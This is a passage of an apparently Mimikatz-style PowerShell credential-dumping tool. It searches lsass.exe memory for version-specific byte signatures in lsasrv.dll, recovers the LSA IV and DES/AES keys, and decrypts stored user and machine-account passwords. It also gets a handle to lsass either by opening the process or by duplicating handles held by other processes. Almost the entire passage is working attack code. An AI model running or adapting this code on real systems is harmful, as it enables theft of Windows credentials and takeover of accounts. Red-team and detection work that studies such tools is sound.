			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		Else
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -79
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -22
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81_NEW").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -le $Global:MINBUILD_WIN_2K3)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7)
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 63
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -69
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 25
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8)
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 59
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -61
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 25
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_10)
		{
			If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE)
			{
				$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d)
				$LSATemplate["Key_Pattern"]["IV_Length"] = 16
				$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 62
				$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -70
				$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 23
				$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
				$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY8").ScriptBlock
				$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
				$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
			}
			Else
			{
				$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15)
				$LSATemplate["Key_Pattern"]["IV_Length"] = 16
				$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 62
				$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -70
				$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 23
				$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
				$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
				$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
				$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
			}
		}
		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1809)
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 61
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -73
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 16
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		Else
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 67
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -89
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = 16
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
	}
	Else
	{
		Write-Host ("[-] Unsupported processor architecture = {0}" -f ($Dump["SysInfo"]["ProcessorArchitecture"]))
		return $Null
	}

	# Search LSA main structure signature address in lsasrv.dll pages
	$SigPos = $Null
	$SigIndexes = $Null
	ForEach ($Module in $Dump["LsassModules"])
	{
		If ($Module["Name"] -eq "lsasrv.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $LSATemplate["Key_Pattern"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($SigIndexes) { Break }
	}
	If (-not $SigPos)
	{
		Write-Host ("[-] Unable to find LSA signature into lsasrv.dll module")
		return $Null
	}
	Write-Host ("[+] Found LSA signature at address 0x{0:X8} into lsasrv.dll module" -f ($SigPos))

	<### LSA Decryptor ###>

	$LSADecryptor = @{}
	$LSADecryptor["IV"] = $Null
	$LSADecryptor["DES_Key"] = $Null
	$LSADecryptor["AES_Key"] = $Null

	# Find IV and DES/AES Keys
	$Addr_IVPtr = $SigPos + $LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"]
	$Addr_DESKeyPtr = $SigPos + $LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"]
	$Addr_AESKeyPtr = $SigPos + $LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"]

	$IVPtr = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr_IVPtr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($IVPtr)
	{
		$Buff, $OffAddr, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $IVPtr
		$LSADecryptor["IV"] = $Buff[$OffAddr..($OffAddr + $LSATemplate["Key_Pattern"]["IV_Length"] - 1)]
	}

	$DESKeyPtr = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr_DESKeyPtr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($DESKeyPtr)
	{
		$DESKeyHandlePtr = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $DESKeyPtr $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($DESKeyHandlePtr)
		{
			$Buff, $OffAddrDES, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $DESKeyHandlePtr
			If ($Buff)
			{
				$BuffDES = $Buff[$OffAddrDES..($Buff.Length-1)]
				$BaseAddrDES = $BaseAddr + $OffAddrDES
				$DESHandleStruct = @{}
				$LSATemplate["Key_Handle_Struct"].Invoke($BuffDES, $DESHandleStruct, $BaseAddrDES)
				If (@(Compare-Object $DESHandleStruct["Tag"] $LSATemplate["Key_Handle_Struct_Tag"] -SyncWindow 0).Length -ne 0)
				{
					Write-Host ("[-] Invalid tag into DES Handle structure")
					return $Null
				}

				$DESStruct = @{}
				$BuffDES = $BuffDES[($DESHandleStruct["Ptr_Key"] - $BaseAddrDES)..($BuffDES.Length-1)]
				$BaseAddrDES = $DESHandleStruct["Ptr_Key"]
				$LSATemplate["Key_Struct"].Invoke($BuffDES, $DESStruct, $BaseAddrDES)
				If (@(Compare-Object $DESStruct["Tag"] $LSATemplate["Key_Struct_Tag"] -SyncWindow 0).Length -eq 0)
				{
					$LSADecryptor["DES_Key"] = $DESStruct["Data"]
				}
				Else
				{
					Write-Host ("[-] Invalid tag into DES structure")
					return $Null
				}
			}
		}
	}

	$AESKeyPtr = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr_AESKeyPtr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($AESKeyPtr)
	{
		$AESKeyHandlePtr = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $AESKeyPtr $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($AESKeyHandlePtr)
		{
			$Buff, $OffAddrAES, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $AESKeyHandlePtr
			If ($Buff)
			{
				$BuffAES = $Buff[$OffAddrAES..($Buff.Length-1)]
				$BaseAddrAES = $BaseAddr + $OffAddrAES
				$AESHandleStruct = @{}
				$LSATemplate["Key_Handle_Struct"].Invoke($BuffAES, $AESHandleStruct, $BaseAddrAES)
				If (@(Compare-Object $AESHandleStruct["Tag"] $LSATemplate["Key_Handle_Struct_Tag"] -SyncWindow 0).Length -ne 0)
				{
					Write-Host ("[-] Invalid tag into AES Handle structure")
					return $Null
				}

				$AESStruct = @{}
				$BuffAES = $BuffAES[($AESHandleStruct["Ptr_Key"] - $BaseAddrAES)..($BuffAES.Length-1)]
				$BaseAddrAES = $AESHandleStruct["Ptr_Key"]
				$LSATemplate["Key_Struct"].Invoke($BuffAES, $AESStruct, $BaseAddrAES)
				If (@(Compare-Object $AESStruct["Tag"] $LSATemplate["Key_Struct_Tag"] -SyncWindow 0).Length -eq 0)
				{
					$LSADecryptor["AES_Key"] = $AESStruct["Data"]
				}
				Else
				{
					Write-Host ("[-] Invalid tag into AES structure")
					return $Null
				}
			}
		}
	}

	Write-Host ("[...] IV = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["IV"]).Replace("-", "")))
	Write-Host ("[...] DES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["DES_Key"]).Replace("-", "")))
	Write-Host ("[...] AES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["AES_Key"]).Replace("-", "")))

	return $LSADecryptor
}

<#
	Decrypt secret with LSA Keys founded into lsass.exe
#>
function LSADecrypt-Pwd($LSADecryptor, $EncPwd, $UserName, $RawBytes)
{
	If ((-not $LSADecryptor["AES_Key"]) -or (-not $LSADecryptor["IV"]))
	{
		return $Null
	}

	$Size = $EncPwd.Length
	If ($Size)
	{
		If ($Size % 8)
		{
			$ClearText = AESTransform $LSADecryptor["AES_Key"] $EncPwd $LSADecryptor["IV"] ([Security.Cryptography.CipherMode]::CFB) $False
		}
		Else
		{
			$ClearText = TripleDESTransform $LSADecryptor["DES_Key"] $EncPwd $LSADecryptor["IV"][0..7] ([Security.Cryptography.CipherMode]::CBC) $False
		}
	}

	If ($RawBytes) { return $ClearText }
	Else
	{
		If ($UserName.Substring($UserName.Length-1, 1) -eq "$")
		{
			# = Machine account -> Manualy convert byte array to lowercase hex string
			# And hex string to Unicode byte array
			$Res = @()
			$HexText = ""
			ForEach ($Byte in $ClearText) { $HexText += $Byte.ToString("x2") }
			$ClearText = [Text.Encoding]::ASCII.GetBytes($HexText)
			ForEach ($Byte in $ClearText) { $Res += ($Byte, [Byte]0x0) }

			return $Res
		}
		Else
		{
			# = User account -> Remove trim zeroes
			$End = $ClearText.Length - 1
			While ($ClearText[$End] -eq [Byte]0x0)
			{
				If ($ClearText[$End - 1] -eq [Byte]0x0)
				{
					$ClearText = $ClearText[0..($End - 1)]
					$End -= 1
				}
				Else
				{
					Break
				}
			}

			return $ClearText
		}
	}
}

<### Get handle to lsass.exe and found memory pages and modules ###>

<#
	1- Get loaded modules from lsass.exe
		1.5- Store timestamp of MSV1 module: Will be used to differentiate MSV template version depending on OS
	2- Get memory pages from handle on lsass.exe
	3- For all pages, for all modules, found which page is into region addr of module and add the page to module pages
#>
function GetModulesAndPages($pHandle, $SysInfo)
{
	# 1- Get modules of process
	$Modules = @()
	$cb = 1000
	$lpcbNeeded = 10000
	While ($cb -lt $lpcbNeeded)
	{
		$ModulesHandles = New-Object IntPtr[] $lpcbNeeded
		$Succeeded = [WinProcAPI]::EnumProcessModules($pHandle, $ModulesHandles, $cb, [ref] $lpcbNeeded)
		If (-not $Succeeded)
		{
			Write-Host ("[-] EnumProcessModules() failed")
			return $Null
		}
	}

	$NbModules = $lpcbNeeded / [IntPtr]::Size
	$MSV1TimeStamp = $Null
	For ($i = 0; $i -lt $NbModules; $i += 1)
	{
		$ModuleFilePathSize = 1024
		$ModuleFilePath = New-Object Text.StringBuilder $ModuleFilePathSize
		$BytesWritten = [WinProcAPI]::GetModuleFileNameEx($pHandle, $ModulesHandles[$i], $ModuleFilePath, $ModuleFilePathSize)
		If (-not $BytesWritten)
		{
			Write-Host ("[-] GetModuleFileNameEx() failed")
			return $Null
		}

		$ModuleFileName = ($ModuleFilePath -Split "\\")[($ModuleFilePath -Split "\\").Count-1]
		$CreationUnixTimeStamp = 0
		If ($ModuleFileName -eq "msv1_0.dll")
		{
			$CreationUnixTimeStamp = [UInt64]((Get-Date -Date (Get-Date -Date (Get-ChildItem $ModuleFilePath).CreationTime).ToUniversalTime() -UFormat %s).Split(","))[0]
			$MSV1TimeStamp = $CreationUnixTimeStamp
		}

		$ModuleInfo = New-Object WinProcAPI+MODULEINFO
		$Succeeded = [WinProcAPI]::GetModuleInformation($pHandle, $ModulesHandles[$i], [ref] $ModuleInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($ModuleInfo))
		If (-not $Succeeded)
		{
			Write-Host ("[-] GetModuleInformation() failed")
			return $Null
		}

		$Module = @{}
		$Module["Name"] = $ModuleFileName
		$Module["BaseAddress"] = ($ModuleInfo.lpBaseOfDll).ToInt64()
		$Module["Size"] = $ModuleInfo.SizeOfImage
		$Module["EndAddress"] = $Module["BaseAddress"] + $Module["Size"]
		$Module["Timestamp"] = $CreationUnixTimeStamp
		$Module["Pages"] = @()
		$Modules += ,($Module)
	}

	# 2- Get pages info of process
	$Pages = @()
	$CurrentAddr = $SysInfo["lpMinimumApplicationAddress"]
	While ($CurrentAddr -lt $SysInfo["lpMaximumApplicationAddress"])
	{
		$PageInfo = New-Object WinProcAPI+MEMORY_BASIC_INFORMATION
		$BytesWritten = [WinProcAPI]::VirtualQueryEx($pHandle, $CurrentAddr, [ref] $PageInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($PageInfo))
		If (-not $BytesWritten)
		{
			Write-Host ("[-] VirtualQueryEx() failed")
			return $Null
		}

		$CurrentAddr += ($PageInfo.RegionSize).ToInt64()

		$Page = @{}
		$Page["BaseAddress"] = ($PageInfo.BaseAddress).ToInt64()
		$Page["AllocationBase"] = ($PageInfo.AllocationBase).ToInt64()
		$Page["AllocationProtect"] = $PageInfo.AllocationProtect
		$Page["RegionSize"] = [System.Math]::Min(($PageInfo.RegionSize).ToInt64(), 100*1024*1024)
		$Page["EndAddress"] = $Page["BaseAddress"] + $Page["RegionSize"]
		$Pages += ,($Page)
	}

	# 3- For all pages, for all modules, found which page is into region addr of module and add the page to module pages
	ForEach ($Page in $Pages)
	{
		ForEach ($Module in $Modules)
		{
			If ($Page["BaseAddress"] -ge $Module["BaseAddress"] -and $Page["BaseAddress"] -lt $Module["EndAddress"])
			{
				$Module["Pages"] += ,($Page)
			}
		}
	}

	return ($MSV1TimeStamp, $Modules, $Pages)
}

<#
	Two methods implemented for dumping lsass memory: Open process to get handle, or duplicate a handle
#>
function Dump-LSASS($Method)
{
	$SetupPassed = SetupBeforeDumping
	If (-not $SetupPassed) { return $Null }

	# Get system information
	$Info = GetSystemInfo
	$SysInfo = @{}
	$SysInfo["dwPageSize"] = $Info.dwPageSize
	$SysInfo["ProcessorArchitecture"] = $Info.uProcessorInfo.wProcessorArchitecture
	$SysInfo["BuildNumber"] = [UInt64](Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("CurrentBuildNumber")
	$SysInfo["lpMinimumApplicationAddress"] = ($Info.lpMinimumApplicationAddress).ToInt64()
	$SysInfo["lpMaximumApplicationAddress"] = ($Info.lpMaximumApplicationAddress).ToInt64()

	# Load Win API process functions
	LoadWinProcAPI

	Switch ($Method)
	{
		"ProcOpen"
		{
			# Open handle to lsass
			$LsassPID = (Get-Process -Name "lsass").Id
			$LsassHandle = [WinProcAPI]::OpenProcess([WinProcAPI+ProcessAccessFlags]::ALL, $False, $LsassPID)
			If ($LsassHandle)
			{
				# Try to get pages info and modules from lsass handle
				$MSV1TimeStamp, $LsassModules, $LsassPages = GetModulesAndPages $LsassHandle $SysInfo
				If ((-not $LsassModules) -or (-not $LsassPages))
				{
					Write-Host ("[-] Unable to get pages info and modules from lsass handle")
					return $Null
				}
			}
			Else
			{
				Write-Host ("[-] Unable to open lsass process")
				return $Null
			}

			$Dump = @{ "MSV1TimeStamp" = $MSV1TimeStamp; "SysInfo" = $SysInfo; "LsassPID" = $LsassPID; "LsassHandle" = $LsassHandle; "LsassModules" = $LsassModules; "LsassPages" = $LsassPages }
			return $Dump
		}
		"HandleDup"
		{
			# Find handles to lsass.exe process into other processes
			$LsassHandles = @()

			# List system handles
			$ReturnLength = $Null
			$BuffPtrLen = 1024
			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtrLen)
			$Res = [WinProcAPI]::NtQuerySystemInformation([WinProcAPI+SYSTEM_INFORMATION_CLASS]::SystemHandleInformation, $BuffPtr, $BuffPtrLen, [ref] $ReturnLength)
			While ($Res -ne [UInt32]([WinProcAPI]::STATUS_SUCCESS))
			{
				If ($Res -eq [Uint32]([WinProcAPI]::STATUS_INFO_LENGTH_MISMATCH))
				{
					$BuffPtrLen = [System.Math]::Max($BuffPtrLen, $ReturnLength)
					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
					[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtrLen)
					$Res = [WinProcAPI]::NtQuerySystemInformation([WinProcAPI+SYSTEM_INFORMATION_CLASS]::SystemHandleInformation, $BuffPtr, $BuffPtrLen, [ref] $ReturnLength)
				}
				Else
				{
					Write-Host ("[-] NtQuerySystemInformation() failed with error {0}" -f ($Res))
					return $Null
				}
			}

			# Get number of system handles return = first 4 bytes of buffer
			$BuffOffset = $BuffPtr.ToInt64()
			$HandlesCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
			$BuffOffset = $BuffOffset + [System.IntPtr]::Size

			If ([System.IntPtr]::Size -eq 4)
			{
				$SYSTEM_HANDLE_INFORMATION_Size = 16 # This makes sense!
			}
			Else
			{
				$SYSTEM_HANDLE_INFORMATION_Size = 24 # This doesn't make sense, should be 20 on x64 but it is not the case
			}
			$SYSTEM_HANDLE_INFORMATION = New-Object WinProcAPI+SYSTEM_HANDLE_INFORMATION

			# Enumerate over all system handle information
			For ($i = 0; $i -lt $HandlesCount; $i += 1)
			{
				$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SystemPointer, [Type]$SYSTEM_HANDLE_INFORMATION.GetType())

				# Get process ID and handle of a single system handle information
				$SysProcessId = $Cast.ProcessId # The process ID
				$SysHandle = $Cast.Handle # A handle opened by the process

				If ($SysProcessId -ne 4)
				{
					# Open handle to the process ID
					$pHandle = [WinProcAPI]::OpenProcess([WinProcAPI+ProcessAccessFlags]::PROCESS_DUP_HANDLE, $False, $SysProcessId)
					If ($pHandle.ToInt64())
					{
						$DupHandle = New-Object IntPtr
						$CurrProcHandle = [WinProcAPI]::GetCurrentProcess()
						# Duplicate handle opened by the process ID
						# We provide:
						# pHandle = Handle to the process ID
						# SysHandle = Handle opened by the process ID
						# CurrProcHandle = Handle on the current process
						# DupHandle = Ptr to the variable that will store duplicate of the handle opened by the process ID
						$DupSucceeded = [WinProcAPI]::DuplicateHandle($pHandle, $SysHandle, $CurrProcHandle, [ref] $DupHandle, [WinProcAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION -bxor [WinProcAPI+ProcessAccessFlags]::PROCESS_VM_READ, $False, 0)
						If ($DupSucceeded)
						{
							$ReturnLength = $Null
							$BuffPtrLen = 1024
							[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtrLen)
							$Res = [WinProcAPI]::NtQueryObject($DupHandle, [WinProcAPI+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, $BuffPtr, $BuffPtrLen, [ref] $ReturnLength)
							While ($Res -ne [UInt32]([WinProcAPI]::STATUS_SUCCESS))
							{
								If ($Res -eq [Uint32]([WinProcAPI]::STATUS_INFO_LENGTH_MISMATCH))
								{
									$BuffPtrLen = [System.Math]::Max($BuffPtrLen, $ReturnLength)
									[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
									[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtrLen)
									$Res = [WinProcAPI]::NtQueryObject($DupHandle, [WinProcAPI+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, $BuffPtr, $BuffPtrLen, [ref] $ReturnLength)
								}
								Else
								{
									Write-Host ("[-] NtQueryObject() failed with error {0}" -f ($Res))
									return $Null
								}
							}

							$oInfo = New-Object WinProcAPI+OBJECT_TYPE_INFORMATION
							$SystemPointer = New-Object System.Intptr -ArgumentList $BuffPtr.ToInt64()
							$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SystemPointer, [Type]$oInfo.GetType())

							# If the duplicated handle is a handle to a process
							If ($Cast.TypeName.buffer -eq "Process")
							{
								$BuffLen = 1024
								$ProcessName = New-Object System.Text.StringBuilder $BuffLen
								# Get file name of process hold by the handle
								$BytesWritten = [WinProcAPI]::GetProcessImageFileName($DupHandle, $ProcessName, $BuffLen)
								If ($BytesWritten)
								{
									# If it is a handle to lsass.exe we can store It
									If ($ProcessName -Like "*lsass.exe*")
									{
										$LsassHandles += $DupHandle
									}
								}
							}
						}
					}
				}

				$BuffOffset = $BuffOffset + $SYSTEM_HANDLE_INFORMATION_Size
			}

			# Do not close SysHandle because It is use by the system process ID
			$Succeeded = [WinProcAPI]::CloseHandle($pHandle)
			If (-not $Succeeded)
			{
				Write-Host ("[-] CloseHandle() failed")
				return $Null
			}
			$Succeeded = [WinProcAPI]::CloseHandle($CurrProcHandle)
			If (-not $Succeeded)
			{
				Write-Host ("[-] CloseHandle() failed")
				return $Null
			}

			# Try to get pages info and modules from lsass handles
			If ($LsassHandles.Count -ne 0)
			{
				Write-Host ("[+] Found {0} handles to lsass.exe" -f ($LsassHandles.Count))

				$Dumped = $False
				$HandleId = 0
				For ($i = 0; $i -lt $LsassHandles.Count; $i += 1)
				{
					$MSV1TimeStamp, $LsassModules, $LsassPages = GetModulesAndPages $LsassHandles[$i] $SysInfo
					If ($LsassModules -and $LsassPages)
					{
						$Dumped = $True
						$HandleId = $i

						# We found modules and pages so we can close all other duplicates handle
						For ($i = 0; $i -lt $LsassHandles.Count; $i += 1)
						{
							If ($i -ne $HandleId)
							{
								$Succeeded = [WinProcAPI]::CloseHandle($LsassHandles[$i])
								If (-not $Succeeded)
								{
									Write-Host ("[-] CloseHandle() failed")
									return $Null
								}
							}
						}

						Break
					}
				}

				If (-not $Dumped)
				{
					Write-Host ("[-] Unable to get pages info and modules from lsass handle")
					return $Null
				}
				Else
				{
					$LsassPID = (Get-Process -Name "lsass").Id
					$Dump = @{ "MSV1TimeStamp" = $MSV1TimeStamp; "SysInfo" = $SysInfo; "LsassPID" = $LsassPID; "LsassHandle" = $LsassHandles[$HandleId]; "LsassModules" = $LsassModules; "LsassPages" = $LsassPages }
					return $Dump
				}
			}
			Else
			{
				Write-Host ("[-] Unable to find open handles to lsass.exe")
				return $Null
			}
		}
		default
		{
			Write-Host ("[-] Method not implemented")
			return $Null
		}
	}
}

<#
	We have handle to lsass.exe process, start to dump secrets with templates and decrypt them with LSA decryption keys
#>
function Parse-LSASS($Dump)
{
	# Documented values at MSDN are marked with an asterisk
	$Global:PROCESSOR_ARCHITECTURE_UNKNOWN        = 0xFFFF; # Unknown architecture.
	$Global:PROCESSOR_ARCHITECTURE_INTEL          = 0       # x86 (AMD or Intel) *
	$Global:PROCESSOR_ARCHITECTURE_MIPS           = 1       # MIPS
	$Global:PROCESSOR_ARCHITECTURE_ALPHA          = 2       # Alpha
	$Global:PROCESSOR_ARCHITECTURE_PPC            = 3       # Power PC
	$Global:PROCESSOR_ARCHITECTURE_SHX            = 4       # SHX
	$Global:PROCESSOR_ARCHITECTURE_ARM            = 5       # ARM
	$Global:PROCESSOR_ARCHITECTURE_IA64           = 6       # Intel Itanium *
	$Global:PROCESSOR_ARCHITECTURE_ALPHA64        = 7       # Alpha64
	$Global:PROCESSOR_ARCHITECTURE_MSIL           = 8       # MSIL
	$Global:PROCESSOR_ARCHITECTURE_AMD64          = 9       # x64 (AMD or Intel) *
	$Global:PROCESSOR_ARCHITECTURE_IA32_ON_WIN64  = 10      # IA32 on Win64
	$Global:PROCESSOR_ARCHITECTURE_SPARC          = 20      # Sparc (Wine)

	# PROCESSOR_OPTIL value found at http://code.google.com/p/ddab-lib/
	# Documented values at MSDN are marked with an asterisk
	$Global:PROCESSOR_INTEL_386     = 386    # Intel i386 *
	$Global:PROCESSOR_INTEL_486     = 486    # Intel i486 *
	$Global:PROCESSOR_INTEL_PENTIUM = 586    # Intel Pentium *
	$Global:PROCESSOR_INTEL_IA64    = 2200   # Intel IA64 (Itanium) *
	$Global:PROCESSOR_AMD_X8664     = 8664   # AMD X86 64 *
	$Global:PROCESSOR_MIPS_R4000    = 4000   # MIPS R4000, R4101, R3910
	$Global:PROCESSOR_ALPHA_21064   = 21064  # Alpha 210 64
	$Global:PROCESSOR_PPC_601       = 601    # PPC 601
	$Global:PROCESSOR_PPC_603       = 603    # PPC 603
	$Global:PROCESSOR_PPC_604       = 604    # PPC 604
	$Global:PROCESSOR_PPC_620       = 620    # PPC 620
	$Global:PROCESSOR_HITACHI_SH3   = 10003  # Hitachi SH3 (Windows CE)
	$Global:PROCESSOR_HITACHI_SH3E  = 10004  # Hitachi SH3E (Windows CE)
	$Global:PROCESSOR_HITACHI_SH4   = 10005  # Hitachi SH4 (Windows CE)
	$Global:PROCESSOR_MOTOROLA_821  = 821    # Motorola 821 (Windows CE)
	$Global:PROCESSOR_SHx_SH3       = 103    # SHx SH3 (Windows CE)
	$Global:PROCESSOR_SHx_SH4       = 104    # SHx SH4 (Windows CE)
	$Global:PROCESSOR_STRONGARM     = 2577   # StrongARM (Windows CE)
	$Global:PROCESSOR_ARM720        = 1824   # ARM 720 (Windows CE)
	$Global:PROCESSOR_ARM820        = 2080   # ARM 820 (Windows CE)
